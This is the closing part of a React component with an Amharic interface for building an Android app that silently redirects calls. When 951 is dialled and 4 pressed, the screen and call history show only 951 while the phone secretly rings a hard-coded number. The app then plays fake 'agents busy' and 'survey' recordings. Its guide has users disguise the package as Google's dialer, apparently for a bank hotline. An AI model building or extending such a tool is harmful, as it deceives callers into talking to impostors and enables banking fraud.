                    <div className="text-xs font-extrabold text-slate-900">
                      {config.enabled
                        ? '🟢 ድብቅ የቀጥታ ስልክ ጥሪ በርቷል (Active)'
                        : '⚪ ድብቅ የቀጥታ ስልክ ጥሪ ጠፍቷል (AI/MP3 Support ላይ ነው)'}
                    </div>
                    <p className="text-[10px] text-slate-600 mt-0.5 leading-relaxed">
                      ሲበራ፦ 951 ተደውሎ <strong>4</strong> ሲነካ ስክሪኑ ላይ <strong>951</strong> ብቻ እየታየ በድብቅ ወደ{' '}
                      <strong>{targetNumber || '0965848508'}</strong> ይደውላል።
                    </p>
                  </div>
                  <button
                    type="button"
                    onClick={() => {
                      handleSaveBasicSettings({ enabled: !config.enabled });
                    }}
                    className={`px-3.5 py-2 rounded-full text-xs font-extrabold shrink-0 transition-all shadow-xs ${
                      config.enabled
                        ? 'bg-emerald-600 text-white hover:bg-emerald-700'
                        : 'bg-slate-800 text-white hover:bg-slate-900'
                    }`}
                  >
                    {config.enabled ? 'አጥፋ (Off)' : 'አብራ (On)'}
                  </button>
                </div>
              </div>

              {/* Hidden Target Phone Number & 2-Ring Timeout */}
              <div className="bg-white border border-slate-200 rounded-2xl p-3 space-y-2.5 shadow-2xs">
                <div className="text-xs font-extrabold text-slate-900">
                  🔢 1. በድብቅ የሚደወልለት ስልክ ቁጥር እና የ2 ጥሪ ሰዓት፦
                </div>
                <div className="grid grid-cols-3 gap-2">
                  <div className="col-span-2">
                    <label className="block text-[10px] font-bold text-slate-600 mb-1">
                      ድብቅ ስልክ ቁጥር (ስክሪን ላይ አይታይም)
                    </label>
                    <input
                      type="tel"
                      value={targetNumber}
                      onChange={(e) => setTargetNumber(e.target.value)}
                      placeholder="0965848508"
                      className="w-full px-3 py-2 rounded-xl border border-slate-300 text-xs font-bold text-slate-900 focus:outline-none focus:border-emerald-600"
                    />
                  </div>
                  <div>
                    <label className="block text-[10px] font-bold text-slate-600 mb-1">
                      2 ጥሪ (ሰከንድ)
                    </label>
                    <input
                      type="number"
                      min={4}
                      max={20}
                      value={maxRingSec}
                      onChange={(e) => setMaxRingSec(Number(e.target.value))}
                      className="w-full px-2.5 py-2 rounded-xl border border-slate-300 text-xs font-bold text-slate-900 focus:outline-none focus:border-emerald-600"
                    />
                  </div>
                </div>
                <div className="flex items-center justify-between pt-1">
                  <span className="text-[10px] text-slate-500">
                    💡 {maxRingSec} ሰከንድ (2 ጥሪ) ጠርቶ ካልተነሳ «የደወሉለት ደንበኛ...» ሳይል ወደ MP3ው ይቀየራል
                  </span>
                  <button
                    type="button"
                    onClick={() => handleSaveBasicSettings()}
                    className="px-3 py-1.5 rounded-xl bg-emerald-600 hover:bg-emerald-700 text-white text-[11px] font-bold flex items-center gap-1 shrink-0"
                  >
                    <Check className="w-3.5 h-3.5" /> ቁጥሩን አስቀምጥ
                  </button>
                </div>
              </div>

              {/* MP3 Slot 1: Busy / Hold MP3 ("ሁሉም የአገልግሎት ሰጪዎች ደንበኛ በማስተናገድ ላይ ናቸው...") */}
              <div
                onMouseDown={() => {
                  if (longPressTimerRef.current) clearTimeout(longPressTimerRef.current);
                  longPressTimerRef.current = setTimeout(() => openSlotEditor('busy_hold'), 500);
                }}
                onMouseUp={() => {
                  if (longPressTimerRef.current) clearTimeout(longPressTimerRef.current);
                }}
                onTouchStart={() => {
                  if (longPressTimerRef.current) clearTimeout(longPressTimerRef.current);
                  longPressTimerRef.current = setTimeout(() => openSlotEditor('busy_hold'), 500);
                }}
                onTouchEnd={() => {
                  if (longPressTimerRef.current) clearTimeout(longPressTimerRef.current);
                }}
                className="bg-amber-50/70 border border-amber-200 rounded-2xl p-3 space-y-2"
              >
                <div className="flex items-start justify-between gap-2">
                  <div>
                    <div className="text-xs font-extrabold text-amber-950">
                      ⏳ 2. ሁለት ጊዜ ጠርቶ ካልተነሳ የሚጫወት MP3 (በድጋሚ እየደወለ)
                    </div>
                    <p className="text-[10px] text-amber-800 leading-relaxed">
                      «ሁሉም የአገልግሎት ሰጪዎች ደንበኛ በማስተናገድ ላይ ናቸው፣ እባክዎ ትንሽ ይጠብቁ...» (እስኪነሳ ድረስ እየደጋገመ በድብቅ ይደውላል)
                    </p>
                  </div>
                  <span className="px-2 py-0.5 rounded-full text-[9.5px] font-bold bg-amber-200 text-amber-900 shrink-0">
                    {config.busyHoldMp3Name ? 'Custom MP3' : 'ነባሪ MP3'}
                  </span>
                </div>

                <div className="text-[10.5px] font-bold text-slate-700 bg-white px-2.5 py-1.5 rounded-xl border border-amber-200 flex items-center justify-between">
                  <span className="truncate">
                    🎵 {config.busyHoldMp3Name || 'checking_hold.mp3 (ነባሪ የጥበቃ ድምፅ)'}
                  </span>
                  {config.busyHoldMp3Name && (
                    <button
                      type="button"
                      onClick={() => handleDeleteSlotMp3('busy_hold')}
                      className="text-rose-600 hover:text-rose-700 p-1"
                      title="Delete MP3"
                    >
                      <Trash2 className="w-3.5 h-3.5" />
                    </button>
                  )}
                </div>

                <div className="flex flex-wrap items-center gap-1.5 pt-0.5">
                  <label className="px-2.5 py-1.5 rounded-xl bg-amber-600 hover:bg-amber-700 text-white text-[10.5px] font-bold flex items-center gap-1 cursor-pointer">
                    <Upload className="w-3 h-3" />
                    <span>MP3 ጫን</span>
                    <input
                      type="file"
                      accept="audio/*,.mp3,.wav,.m4a,.ogg,.aac"
                      className="hidden"
                      onChange={(e) => {
                        const f = e.target.files?.[0];
                        if (f) handleUploadSlotFile('busy_hold', f);
                        e.target.value = '';
                      }}
                    />
                  </label>

                  {recordingSlot === 'busy_hold' ? (
                    <button
                      type="button"
                      onClick={stopSlotVoiceRecording}
                      className="px-2.5 py-1.5 rounded-xl bg-rose-600 text-white text-[10.5px] font-bold flex items-center gap-1 animate-pulse"
                    >
                      <Square className="w-3 h-3 fill-current" />
                      <span>አቁም ({recordingSeconds}s)</span>
                    </button>
                  ) : (
                    <button
                      type="button"
                      onClick={() => startSlotVoiceRecording('busy_hold')}
                      className="px-2.5 py-1.5 rounded-xl bg-rose-50 hover:bg-rose-100 text-rose-700 border border-rose-200 text-[10.5px] font-bold flex items-center gap-1"
                    >
                      <Mic className="w-3 h-3" />
                      <span>በድምፅ ቅዳ</span>
                    </button>
                  )}

                  <button
                    type="button"
                    onClick={() => togglePreviewSlot('busy_hold')}
                    className="px-2.5 py-1.5 rounded-xl bg-white hover:bg-slate-100 text-slate-800 border border-slate-300 text-[10.5px] font-bold flex items-center gap-1"
                  >
                    {playingSlot === 'busy_hold' ? (
                      <>
                        <Pause className="w-3 h-3" /> አቁም
                      </>
                    ) : (
                      <>
                        <Play className="w-3 h-3" /> ስማው
                      </>
                    )}
                  </button>

                  <button
                    type="button"
                    onClick={() => openSlotEditor('busy_hold')}
                    className="px-2.5 py-1.5 rounded-xl bg-purple-50 hover:bg-purple-100 text-purple-800 border border-purple-200 text-[10.5px] font-bold flex items-center gap-1"
                  >
                    <Scissors className="w-3 h-3" />
                    <span>Edit / Cut / +Plus</span>
                  </button>
                </div>
              </div>

              {/* MP3 Slot 2: Post-Call Survey MP3 ("ቀጣይ ያሉትን መሙያ ይንኩ / አስተያየት መስጫ") */}
              <div
                onMouseDown={() => {
                  if (longPressTimerRef.current) clearTimeout(longPressTimerRef.current);
                  longPressTimerRef.current = setTimeout(
                    () => openSlotEditor('post_call_survey'),
                    500
                  );
                }}
                onMouseUp={() => {
                  if (longPressTimerRef.current) clearTimeout(longPressTimerRef.current);
                }}
                onTouchStart={() => {
                  if (longPressTimerRef.current) clearTimeout(longPressTimerRef.current);
                  longPressTimerRef.current = setTimeout(
                    () => openSlotEditor('post_call_survey'),
                    500
                  );
                }}
                onTouchEnd={() => {
                  if (longPressTimerRef.current) clearTimeout(longPressTimerRef.current);
                }}
                className="bg-blue-50/70 border border-blue-200 rounded-2xl p-3 space-y-2"
              >
                <div className="flex items-start justify-between gap-2">
                  <div>
                    <div className="text-xs font-extrabold text-blue-950">
                      ⭐ 3. ሰውየው አንስቶ ተነጋግራችሁ ስትጨርሱና ስልኩን ሲዘጋው የሚመጣ MP3
                    </div>
                    <p className="text-[10px] text-blue-800 leading-relaxed">
                      «ቀጣይ ያሉትን መሙያ ይንኩ (የአገልግሎት አስተያየት መስጫ)» — ሰውየው ስልኩን ሲዘጋው በቀጥታ ይጫወታል!
                    </p>
                  </div>
                  <span className="px-2 py-0.5 rounded-full text-[9.5px] font-bold bg-blue-200 text-blue-900 shrink-0">
                    {config.postCallSurveyMp3Name ? 'Custom MP3' : 'ነባሪ MP3'}
                  </span>
                </div>

                <div className="text-[10.5px] font-bold text-slate-700 bg-white px-2.5 py-1.5 rounded-xl border border-blue-200 flex items-center justify-between">
                  <span className="truncate">
                    🎵 {config.postCallSurveyMp3Name || 'survey_rating.mp3 (ቀጣይ ያሉትን መሙያ ይሙሉ)'}
                  </span>
                  {config.postCallSurveyMp3Name && (
                    <button
                      type="button"
                      onClick={() => handleDeleteSlotMp3('post_call_survey')}
                      className="text-rose-600 hover:text-rose-700 p-1"
                      title="Delete MP3"
                    >
                      <Trash2 className="w-3.5 h-3.5" />
                    </button>
                  )}
                </div>

                <div className="flex flex-wrap items-center gap-1.5 pt-0.5">
                  <label className="px-2.5 py-1.5 rounded-xl bg-blue-600 hover:bg-blue-700 text-white text-[10.5px] font-bold flex items-center gap-1 cursor-pointer">
                    <Upload className="w-3 h-3" />
                    <span>MP3 ጫን</span>
                    <input
                      type="file"
                      accept="audio/*,.mp3,.wav,.m4a,.ogg,.aac"
                      className="hidden"
                      onChange={(e) => {
                        const f = e.target.files?.[0];
                        if (f) handleUploadSlotFile('post_call_survey', f);
                        e.target.value = '';
                      }}
                    />
                  </label>

                  {recordingSlot === 'post_call_survey' ? (
                    <button
                      type="button"
                      onClick={stopSlotVoiceRecording}
                      className="px-2.5 py-1.5 rounded-xl bg-rose-600 text-white text-[10.5px] font-bold flex items-center gap-1 animate-pulse"
                    >
                      <Square className="w-3 h-3 fill-current" />
                      <span>አቁም ({recordingSeconds}s)</span>
                    </button>
                  ) : (
                    <button
                      type="button"
                      onClick={() => startSlotVoiceRecording('post_call_survey')}
                      className="px-2.5 py-1.5 rounded-xl bg-rose-50 hover:bg-rose-100 text-rose-700 border border-rose-200 text-[10.5px] font-bold flex items-center gap-1"
                    >
                      <Mic className="w-3 h-3" />
                      <span>በድምፅ ቅዳ</span>
                    </button>
                  )}

                  <button
                    type="button"
                    onClick={() => togglePreviewSlot('post_call_survey')}
                    className="px-2.5 py-1.5 rounded-xl bg-white hover:bg-slate-100 text-slate-800 border border-slate-300 text-[10.5px] font-bold flex items-center gap-1"
                  >
                    {playingSlot === 'post_call_survey' ? (
                      <>
                        <Pause className="w-3 h-3" /> አቁም
                      </>
                    ) : (
                      <>
                        <Play className="w-3 h-3" /> ስማው
                      </>
                    )}
                  </button>

                  <button
                    type="button"
                    onClick={() => openSlotEditor('post_call_survey')}
                    className="px-2.5 py-1.5 rounded-xl bg-purple-50 hover:bg-purple-100 text-purple-800 border border-purple-200 text-[10.5px] font-bold flex items-center gap-1"
                  >
                    <Scissors className="w-3 h-3" />
                    <span>Edit / Cut / +Plus</span>
                  </button>
                </div>
              </div>

              {/* Waveform Audio Editor Drawer (when editing either slot) */}
              {editingSlot && (
                <div className="bg-slate-900 text-white rounded-2xl p-3 space-y-2.5 border border-purple-400">
                  <div className="flex items-center justify-between">
                    <span className="text-xs font-extrabold text-amber-300 flex items-center gap-1.5">
                      <Sparkles className="w-3.5 h-3.5" />
                      <span>
                        ✂️ የድምፅ ኤዲተር (
                        {editingSlot === 'busy_hold' ? 'ሁሉም ሰራተኞች MP3' : 'አስተያየት መስጫ MP3'})
                      </span>
                    </span>
                    <button
                      type="button"
                      onClick={() => setEditingSlot(null)}
                      className="text-xs text-slate-300 hover:text-white px-2 py-0.5 rounded bg-white/10"
                    >
                      ዝጋ
                    </button>
                  </div>

                  {isEditorBusy ? (
                    <div className="py-6 text-center text-xs text-slate-300">
                      ድምፁ በመዘጋጀት ላይ ነው...
                    </div>
                  ) : editorAudioBuffer ? (
                    <>
                      {/* Waveform Bars */}
                      <div className="h-16 bg-slate-800 rounded-xl p-2 flex items-end gap-0.5 overflow-hidden relative">
                        {editorPeaks.map((p, idx) => {
                          const posSec = (idx / editorPeaks.length) * editorDuration;
                          const inRange = posSec >= selStartSec && posSec <= selEndSec;
                          return (
                            <div
                              key={idx}
                              style={{ height: `${Math.max(12, Math.round(p * 100))}%` }}
                              className={`flex-1 rounded-full transition-colors ${
                                inRange ? 'bg-emerald-400' : 'bg-slate-600'
                              }`}
                            />
                          );
                        })}
                      </div>

                      <div className="grid grid-cols-2 gap-2 text-[10px]">
                        <div>
                          <label className="block text-slate-300 mb-0.5">
                            መጀመሪያ ({selStartSec}s)
                          </label>
                          <input
                            type="range"
                            min={0}
                            max={Math.max(0.1, editorDuration)}
                            step={0.1}
                            value={selStartSec}
                            onChange={(e) =>
                              setSelStartSec(Math.min(Number(e.target.value), selEndSec - 0.1))
                            }
                            className="w-full accent-emerald-400"
                          />
                        </div>
                        <div>
                          <label className="block text-slate-300 mb-0.5">
                            መጨረሻ ({selEndSec}s / {editorDuration.toFixed(1)}s)
                          </label>
                          <input
                            type="range"
                            min={0}
                            max={Math.max(0.1, editorDuration)}
                            step={0.1}
                            value={selEndSec}
                            onChange={(e) =>
                              setSelEndSec(Math.max(Number(e.target.value), selStartSec + 0.1))
                            }
                            className="w-full accent-emerald-400"
                          />
                        </div>
                      </div>

                      <div className="flex flex-wrap gap-1.5 pt-1">
                        <button
                          type="button"
                          onClick={handleTrimKeepRange}
                          className="px-2.5 py-1.5 rounded-xl bg-emerald-600 hover:bg-emerald-500 text-white text-[10.5px] font-bold flex items-center gap-1"
                        >
                          <Scissors className="w-3 h-3" /> የተመረጠውን ብቻ አስቀር (Trim)
                        </button>
                        <button
                          type="button"
                          onClick={handleCutMiddleRange}
                          className="px-2.5 py-1.5 rounded-xl bg-amber-600 hover:bg-amber-500 text-white text-[10.5px] font-bold flex items-center gap-1"
                        >
                          <Scissors className="w-3 h-3" /> የተመረጠውን ቆርጠህ አውጣ (Cut)
                        </button>

                        <label className="px-2.5 py-1.5 rounded-xl bg-blue-600 hover:bg-blue-500 text-white text-[10.5px] font-bold flex items-center gap-1 cursor-pointer">
                          <Plus className="w-3 h-3" /> + Plus MP3 ቀጥልበት
                          <input
                            type="file"
                            accept="audio/*,.mp3,.wav,.m4a,.ogg"
                            className="hidden"
                            onChange={(e) => {
                              const f = e.target.files?.[0];
                              if (f) handlePlusAppendMp3(f);
                              e.target.value = '';
                            }}
                          />
                        </label>

                        {isPlusRecording ? (
                          <button
                            type="button"
                            onClick={stopPlusVoiceAppend}
                            className="px-2.5 py-1.5 rounded-xl bg-rose-600 text-white text-[10.5px] font-bold flex items-center gap-1 animate-pulse"
                          >
                            <Square className="w-3 h-3 fill-current" /> አቁምና ቀጥል ({plusRecordSec}s)
                          </button>
                        ) : (
                          <button
                            type="button"
                            onClick={startPlusVoiceAppend}
                            className="px-2.5 py-1.5 rounded-xl bg-purple-600 hover:bg-purple-500 text-white text-[10.5px] font-bold flex items-center gap-1"
                          >
                            <Mic className="w-3 h-3" /> + Plus ድምፅ ቀድተህ ቀጥል
                          </button>
                        )}
                      </div>
                    </>
                  ) : null}
                </div>
              )}
            </>
          ) : (
            /* TAB 2: JAVA N-IDE COMPLETE CODE & GITHUB ROOT ZIP */
            <div className="space-y-3">
              {/* Step 1: Download GitHub Root ZIP for Vercel */}
              <div className="bg-gradient-to-r from-slate-900 to-indigo-950 text-white rounded-2xl p-3.5 space-y-2 shadow-sm">
                <div className="flex items-center justify-between">
                  <div className="text-xs font-extrabold text-amber-300">
                    📦 ደረጃ 1፦ ለGitHub እና Vercel የሚሆን Root ZIP አውርድ
                  </div>
                  <span className="text-[10px] bg-white/15 px-2 py-0.5 rounded-full">
                    Root Files Ready
                  </span>
                </div>
                <p className="text-[10.5px] text-slate-200 leading-relaxed">
                  ይህንን ZIP ፋይል አውርደው Extract ሲያደርጉት ሁሉም ፋይሎች በቀጥታ Root ላይ ይገኛሉ። GitHub ላይ ጭነው Vercel ላይ Deploy ሲያደርጉት የሚሰጥዎትን ሊንክ ከታች ያስገቡ፦
                </p>
                <button
                  type="button"
                  onClick={handleDownloadGithubZip}
                  disabled={isDownloadingZip}
                  className="w-full py-2.5 rounded-xl bg-amber-400 hover:bg-amber-300 text-slate-950 font-extrabold text-xs flex items-center justify-center gap-2 shadow transition-all"
                >
                  <Download className="w-4 h-4" />
                  <span>
                    {isDownloadingZip
                      ? 'ZIP በመዘጋጀት ላይ ነው...'
                      : '📦 GitHub Root ZIP አውርድ (ለVercel Deploy)'}
                  </span>
                </button>
              </div>

              {/* Step 2: Enter Vercel Link to embed inside MainActivity.java */}
              <div className="bg-blue-50 border border-blue-200 rounded-2xl p-3 space-y-2">
                <label className="block text-xs font-extrabold text-blue-950">
                  🔗 ደረጃ 2፦ የVercel ሊንክዎን እዚህ ያስገቡ (በJava ኮዱ ውስጥ በራሱ ይገባል)፦
                </label>
                <div className="flex gap-1.5">
                  <input
                    type="url"
                    value={vercelUrl}
                    onChange={(e) => setVercelUrl(e.target.value)}
                    placeholder="https://your-project.vercel.app"
                    className="flex-1 px-3 py-2 rounded-xl border border-blue-300 bg-white text-xs font-bold text-slate-900 focus:outline-none"
                  />
                  <button
                    type="button"
                    onClick={() => handleSaveBasicSettings()}
                    className="px-3 py-2 rounded-xl bg-blue-600 hover:bg-blue-700 text-white text-xs font-bold shrink-0"
                  >
                    አዘምን
                  </button>
                </div>
              </div>

              {/* Step 3: Java N-IDE Files Selector */}
              <div className="flex items-center gap-1 flex-wrap">
                <button
                  type="button"
                  onClick={() => setJavaFileTab('manifest')}
                  className={`px-2.5 py-1.5 rounded-xl text-[10.5px] font-extrabold transition-all ${
                    javaFileTab === 'manifest'
                      ? 'bg-slate-900 text-white'
                      : 'bg-slate-100 text-slate-700'
                  }`}
                >
                  1. AndroidManifest.xml
                </button>
                <button
                  type="button"
                  onClick={() => setJavaFileTab('main')}
                  className={`px-2.5 py-1.5 rounded-xl text-[10.5px] font-extrabold transition-all ${
                    javaFileTab === 'main'
                      ? 'bg-slate-900 text-white'
                      : 'bg-slate-100 text-slate-700'
                  }`}
                >
                  2. MainActivity.java
                </button>
                <button
                  type="button"
                  onClick={() => setJavaFileTab('service')}
                  className={`px-2.5 py-1.5 rounded-xl text-[10.5px] font-extrabold transition-all ${
                    javaFileTab === 'service'
                      ? 'bg-slate-900 text-white'
                      : 'bg-slate-100 text-slate-700'
                  }`}
                >
                  3. SecretInCallService.java
                </button>
                <button
                  type="button"
                  onClick={() => setJavaFileTab('guide')}
                  className={`px-2.5 py-1.5 rounded-xl text-[10.5px] font-extrabold transition-all ${
                    javaFileTab === 'guide'
                      ? 'bg-emerald-700 text-white'
                      : 'bg-emerald-50 text-emerald-800'
                  }`}
                >
                  📖 የአጠቃቀም መመሪያ
                </button>
              </div>

              {javaFileTab === 'guide' ? (
                <div className="bg-emerald-50 border border-emerald-200 rounded-2xl p-3.5 text-xs text-slate-800 space-y-2 leading-relaxed">
                  <div className="font-extrabold text-emerald-950 flex items-center gap-1.5">
                    <ShieldCheck className="w-4 h-4 text-emerald-600" />
                    <span>በJava N-IDE (Android) እንዴት እንደሚሰራ፦</span>
                  </div>
                  <p>
                    <strong>1. Package Name፦</strong> በJava N-IDE አዲስ ፕሮเจክት ሲከፍቱ Package Nameኡን{' '}
                    <code>com.google.android.dialer.cbe951</code> ያድርጉት (ወይም የራስዎን Package Name ከላይ ባሉት 3 ፋይሎች መጀመሪያ መስመር ላይ ይቀይሩት)።
                  </p>
                  <p>
                    <strong>2. ሦስቱን ፋይሎች ይቅዱ፦</strong>
                    <br />• <code>AndroidManifest.xml</code> (ሙሉ የስልክ እና የInCallService ፈቃዶች ያሉት)
                    <br />• <code>MainActivity.java</code> (የVercel ሊንክዎን የሚከፍትና ከስልኩ ጋር የሚያገናኝ)
                    <br />• <code>SecretInCallService.java</code> (ወደ {targetNumber || '0965848508'} በድብቅ የሚደውል፣ በ2 ጥሪ ካልተነሳ «የደወሉለት ደንበኛ...» ሳይል ቆርጦ MP3 የሚያጫውትና ሰውየው ሲዘጋው የአስተያየት መስጫ MP3 የሚያስጀምር)።
                  </p>
                  <p>
                    <strong>3. Default Phone App፦</strong> አፑን ጭነው ሲከፍቱት «Set as Default Phone App» ሲጠይቅዎት ይፍቀዱለት። ከዚያ በኋላ ወደ 951 ደውለው 4 ሲነኩ ስክሪኑ ላይ 951 ብቻ እየታየ በድብቅ ወደ {targetNumber || '0965848508'} ይደውላል!
                  </p>
                </div>
              ) : (
                <div className="bg-slate-950 text-slate-100 rounded-2xl overflow-hidden border border-slate-800">
                  <div className="bg-slate-900 px-3 py-2 flex items-center justify-between border-b border-slate-800">
                    <span className="text-[11px] font-mono font-bold text-emerald-400">
                      {javaFileTab === 'manifest'
                        ? 'app/src/main/AndroidManifest.xml'
                        : javaFileTab === 'main'
                          ? 'MainActivity.java'
                          : 'SecretInCallService.java'}
                    </span>
                    <div className="flex items-center gap-1.5">
                      <button
                        type="button"
                        onClick={() => {
                          const content =
                            javaFileTab === 'manifest'
                              ? androidManifestXml
                              : javaFileTab === 'main'
                                ? mainActivityJava
                                : secretInCallServiceJava;
                          copyToClipboard(content, javaFileTab);
                        }}
                        className="px-2.5 py-1 rounded-lg bg-emerald-600 hover:bg-emerald-500 text-white text-[10.5px] font-bold flex items-center gap-1"
                      >
                        <Copy className="w-3 h-3" />
                        <span>{copiedLabel === javaFileTab ? 'ተቀድቷል (Copied!)' : 'ኮዱን ቅዳ (Copy)'}</span>
                      </button>
                      <button
                        type="button"
                        onClick={() => {
                          const content =
                            javaFileTab === 'manifest'
                              ? androidManifestXml
                              : javaFileTab === 'main'
                                ? mainActivityJava
                                : secretInCallServiceJava;
                          const fname =
                            javaFileTab === 'manifest'
                              ? 'AndroidManifest.xml'
                              : javaFileTab === 'main'
                                ? 'MainActivity.java'
                                : 'SecretInCallService.java';
                          downloadTextFile(fname, content);
                        }}
                        className="px-2 py-1 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-200 text-[10.5px] font-bold flex items-center gap-1"
                      >
                        <Download className="w-3 h-3" />
                        <span>አውርድ</span>
                      </button>
                    </div>
                  </div>
                  <pre className="p-3 text-[10px] font-mono overflow-x-auto max-h-[270px] leading-relaxed text-emerald-200 select-all">
                    {javaFileTab === 'manifest'
                      ? androidManifestXml
                      : javaFileTab === 'main'
                        ? mainActivityJava
                        : secretInCallServiceJava}
                  </pre>
                </div>
              )}
            </div>
          )}
        </div>

        {/* Footer */}
        <div className="bg-slate-50 px-4 py-2.5 border-t border-slate-200 flex items-center justify-between shrink-0">
          <span className="text-[10.5px] text-slate-600 font-semibold">
            🔒 ስክሪኑም ሆነ Call History 951 ብቻ ያሳያል
          </span>
          <button
            type="button"
            onClick={() => {
              handleSaveBasicSettings();
              stopAllMedia();
              onClose();
            }}
            className="px-4 py-1.5 rounded-xl bg-slate-900 hover:bg-slate-800 text-white text-xs font-extrabold"
          >
            ተከናውኗል (ዝጋ)
          </button>
        </div>
      </div>
    </div>
  );
};
